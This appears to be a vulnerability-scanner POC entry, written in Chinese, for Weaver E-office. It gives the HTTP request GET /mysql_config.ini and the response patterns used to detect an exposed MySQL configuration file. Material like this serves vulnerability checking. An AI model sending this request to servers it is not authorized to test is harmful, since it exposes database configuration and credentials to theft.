﻿# 泛微 E-office mysql_config.ini文件可直接访问

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /mysql_config.ini HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：dataname

> 上传文件定位：

> 验证文件来源：泛微 E-office mysql_config.ini文件可直接访问.poc
